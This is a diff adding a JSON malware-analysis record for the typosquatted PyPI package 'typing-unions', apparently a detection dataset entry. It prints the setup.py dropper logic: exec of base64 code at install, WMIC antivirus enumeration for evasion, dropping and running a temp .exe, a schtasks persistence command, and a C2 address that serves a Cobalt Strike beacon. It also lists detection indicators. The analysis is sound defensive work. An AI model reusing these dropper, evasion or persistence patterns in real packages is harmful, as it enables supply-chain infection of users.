@@ -1,0 +1,257 @@
+{
+  "package_info": {
+    "package_name": "typing-unions",
+    "package_manager": "PyPI",
+    "package_versions": "3.10.0.1 (and possibly others)",
+    "why_malicious": "The package is a typosquat of the legitimate 'typing' library, containing heavily obfuscated, multi-stage malware in its setup.py. Upon installation, it executes a base64-encoded Python payload that checks for antivirus products, drops and runs a Windows executable, establishes persistence, fingerprints the victim, and ultimately delivers a Cobalt Strike beacon via a custom C# payload. The malware employs evasion, anti-analysis, and persistence techniques to avoid detection and maintain access."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "setup.py",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "if os.name == 'nt':\n    exec(base64.b64decode(b'aW1wb3J0IHN1YnByb2Nlc3MsIHRlbXBmaWxlLCByYW5kb20sIHN0cmluZywgYmFzZTY0CgpkZWYgUHJvdGVjdCgpOgogICAgdHJ5OgogICAgICAgIGhvb2sgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgn...'))",
+      "code_language": "python",
+      "code_behavior": "At postinstall, the code checks if the OS is Windows, then decodes and executes a base64-encoded Python payload, initiating the multi-stage infection chain.",
+      "malice_analysis": {
+        "why_suspicious": "Decoding and executing base64-encoded code at install time is a classic obfuscation and malware delivery technique, designed to evade static analysis and conceal malicious intent.",
+        "violated_expectations": "setup.py should only handle package installation logic, not execute hidden or obfuscated code that initiates further payloads.",
+        "similar_legitimate_use": "Rarely, some packages may use base64 for licensing or obfuscation, but not for arbitrary code execution during installation.",
+        "key_indicators": [
+          "base64-encoded payload embedded in setup.py",
+          "conditional execution based on Windows OS",
+          "use of exec() on decoded data at install time"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "postinstall (via snippet_1)",
+        "file_location": "decoded payload in setup.py",
+        "required_permissions": [
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "import subprocess, tempfile, random, string, base64\n\ndef Protect():\n    try:\n        hook = subprocess.check_output(r'wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName', creationflags=0x08000000, shell=True).decode('utf-8').replace('\\n', '').split('\\r')[2:-4]\n        for av_software in hook:\n            if av_software > 0:\n                for black in ('totaldefense', 'bitdefender', 'bullguard', 'secure', 'sophos', 'totalav', 'mcafee', 'avira'):\n                    if black in str(av_software.strip()).lower():\n                        return True\n    except:\n        pass",
+      "code_language": "python",
+      "code_behavior": "At postinstall, the code enumerates installed antivirus products using WMIC, checks for a hardcoded blacklist, and aborts further execution if a match is found, enabling anti-analysis and evasion.",
+      "malice_analysis": {
+        "why_suspicious": "Malware often checks for security products to evade detection or avoid execution in analysis environments. The use of WMIC to enumerate AV products is a strong indicator of anti-analysis behavior.",
+        "violated_expectations": "Legitimate packages do not enumerate or react to installed antivirus software during installation.",
+        "similar_legitimate_use": "Security or diagnostic tools may enumerate AV products, but not as part of a package installation process.",
+        "key_indicators": [
+          "WMIC command to enumerate antivirus products",
+          "hardcoded blacklist of AV vendors",
+          "anti-analysis logic to abort on detection"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "postinstall (via snippet_1, if Protect() != True)",
+        "file_location": "decoded payload in setup.py",
+        "required_permissions": [
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "drop_path = tempfile.gettempdir() + ''.join(random.choice(string.ascii_lowercase) for i in range(10)) + '.exe'\ngood_load = base64.b64decode(b'TvqQAAMAAAAEAA...')",
+      "code_language": "python",
+      "code_behavior": "At postinstall, the code decodes a base64-encoded Windows executable and writes it to a randomly named .exe file in the system temp directory, preparing for execution.",
+      "malice_analysis": {
+        "why_suspicious": "Writing and executing a hidden binary during installation is a hallmark of malware, especially when the binary is obfuscated and dropped to a random location.",
+        "violated_expectations": "setup.py should not drop or execute binaries, especially not obfuscated or hidden executables.",
+        "similar_legitimate_use": "Very rare; only legitimate for self-updating or packaging tools, and even then, only with explicit user consent.",
+        "key_indicators": [
+          "base64-encoded Windows PE file in Python script",
+          "randomized .exe filename in temp directory",
+          "writing executable to disk during installation"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "postinstall (via snippet_1, after snippet_3)",
+        "file_location": "decoded payload in setup.py",
+        "required_permissions": [
+          "process_execution"
+        ]
+      },
+      "code_snippet": "open(drop_path, 'wb').write(good_load)\nsubprocess.Popen(drop_path)\n\nMain()",
+      "code_language": "python",
+      "code_behavior": "At postinstall, the code writes the decoded executable to disk and immediately executes it using subprocess.Popen, launching the next stage of the attack chain.",
+      "malice_analysis": {
+        "why_suspicious": "Immediate execution of a dropped binary is a direct malware delivery technique, enabling the next stage of infection without user interaction.",
+        "violated_expectations": "setup.py should not execute arbitrary binaries, especially those it just wrote to disk.",
+        "similar_legitimate_use": "Almost never legitimate in open-source packages; only possible in tightly controlled enterprise environments with user consent.",
+        "key_indicators": [
+          "subprocess.Popen on dropped file",
+          "execution of newly written .exe without user interaction",
+          "chained execution from setup.py"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "runtime (after install, via dropped .exe)",
+        "file_location": "dropped .exe (C# malware)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "persistence"
+        ]
+      },
+      "code_snippet": "schtasks.exe schtasks /create /TN \"Microsoft Assisant\" /TR \"C:\\ProgramData\\Microsoft\\MicrosoftAssisant.exe\" /sc ONLOGON",
+      "code_language": "C# (invokes Windows command)",
+      "code_behavior": "At runtime, the malware creates a persistent scheduled task named 'Microsoft Assisant' that runs the dropped executable from C:\\ProgramData\\Microsoft\\MicrosoftAssisant.exe on user logon, ensuring persistence.",
+      "malice_analysis": {
+        "why_suspicious": "Persistence via scheduled tasks is a common malware tactic, and the use of a misspelled, legitimate-sounding task name is intended to evade casual detection.",
+        "violated_expectations": "Legitimate software should not silently create persistence mechanisms, especially with misleading or obfuscated names.",
+        "similar_legitimate_use": "Some legitimate updaters use scheduled tasks, but not with obfuscated or misleading names and not without user awareness.",
+        "key_indicators": [
+          "schtasks.exe usage to create scheduled task",
+          "scheduled task with typo in name ('Microsoft Assisant')",
+          "task points to dropped malware executable"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_6",
+      "execution_context": {
+        "trigger": "runtime (after install, via dropped .exe)",
+        "file_location": "dropped .exe (C# malware)",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "HTTP request to http://ipwho[.]is/ to retrieve IP and geo-location",
+      "code_language": "C# (network request)",
+      "code_behavior": "At runtime, the malware sends an HTTP request to http://ipwho.is/ to collect the victim's public IP address and geo-location, enabling victim fingerprinting.",
+      "malice_analysis": {
+        "why_suspicious": "Malware often fingerprints victims for command-and-control (C2) targeting or to tailor payloads. Querying an external geo-IP service is a strong indicator of such behavior.",
+        "violated_expectations": "Legitimate software should not exfiltrate system or network information without explicit user consent.",
+        "similar_legitimate_use": "Some legitimate apps may check IP for licensing or geo-restriction, but not in the context of a dropped, hidden executable.",
+        "key_indicators": [
+          "external IP/geo-location service usage (ipwho.is)",
+          "network request from dropped executable"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_7",
+      "execution_context": {
+        "trigger": "runtime (after install, via dropped .exe)",
+        "file_location": "dropped .exe (C# malware)",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "HTTP requests to 77.73.134[.]3:8080/api/v2/GetProfilePicture (retrieves Cobalt Strike beacon)",
+      "code_language": "C# (network request)",
+      "code_behavior": "At runtime, the malware contacts the hardcoded C2 server at 77.73.134.3:8080 to download and execute a Cobalt Strike beacon, granting the attacker full remote access and control.",
+      "malice_analysis": {
+        "why_suspicious": "Contacting a suspicious IP and downloading a known Cobalt Strike beacon is direct evidence of malicious intent and remote access tool deployment.",
+        "violated_expectations": "No legitimate package should download and execute remote code from untrusted sources, especially Cobalt Strike beacons.",
+        "similar_legitimate_use": "None; this behavior is unique to malware and red-team tools.",
+        "key_indicators": [
+          "hardcoded C2 IP address (77.73.134.3:8080)",
+          "retrieval and execution of Cobalt Strike beacon",
+          "network request to suspicious endpoint"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "User installs the malicious package, triggering setup.py.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Obfuscated Python payload execution"
+    },
+    {
+      "step": 2,
+      "action": "Obfuscated Python code checks for blacklisted antivirus products.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "If not detected, proceeds to next stage"
+    },
+    {
+      "step": 3,
+      "action": "Malware decodes and writes a Windows executable to disk.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Execution of dropped binary"
+    },
+    {
+      "step": 4,
+      "action": "Dropped executable is launched.",
+      "implemented_by": [
+        "snippet_4"
+      ],
+      "leads_to": "C# malware execution"
+    },
+    {
+      "step": 5,
+      "action": "C# malware establishes persistence via scheduled task.",
+      "implemented_by": [
+        "snippet_5"
+      ],
+      "leads_to": "Ensures malware runs on logon"
+    },
+    {
+      "step": 6,
+      "action": "C# malware fingerprints victim and contacts C2.",
+      "implemented_by": [
+        "snippet_6"
+      ],
+      "leads_to": "C2 communication and further payload delivery"
+    },
+    {
+      "step": 7,
+      "action": "C# malware downloads and executes Cobalt Strike beacon.",
+      "implemented_by": [
+        "snippet_7"
+      ],
+      "leads_to": "Full remote access/control by attacker"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "setup.py containing base64-encoded payloads and use of exec() to execute decoded code",
+      "postinstall execution of obfuscated or hidden code during package installation",
+      "enumeration of antivirus products via WMIC command in Python scripts",
+      "dropping and executing Windows PE files with randomized names in temp directories",
+      "creation of scheduled tasks with suspicious or misspelled names (e.g., 'Microsoft Assisant')",
+      "network requests to hardcoded C2 infrastructure or suspicious IPs from dropped executables",
+      "retrieval and execution of Cobalt Strike beacons from remote servers"
+    ],
+    "file_indicators": [
+      "setup.py with embedded base64-encoded blobs",
+      "randomly named .exe files in %TEMP% directory",
+      "C:\\ProgramData\\Microsoft\\MicrosoftAssisant.exe",
+      "scheduled task named 'Microsoft Assisant'"
+    ],
+    "network_indicators": [
+      "77.73.134.3:8080",
+      "http://ipwho.is/",
+      "Cobalt Strike beacon traffic patterns"
+    ],
+    "how_to_detect": "Monitor for Python package installations that execute base64-decoded code in setup.py, especially if they drop and execute Windows binaries. Flag any use of WMIC to enumerate antivirus products during package installation. Detect creation of scheduled tasks with suspicious or misspelled names and monitor outbound connections to known C2 IPs or domains associated with Cobalt Strike. Use YARA rules to identify base64-encoded PE files in Python scripts and scan for dropped executables in temp directories. Correlate network activity from dropped executables to suspicious endpoints."
+  }
+}
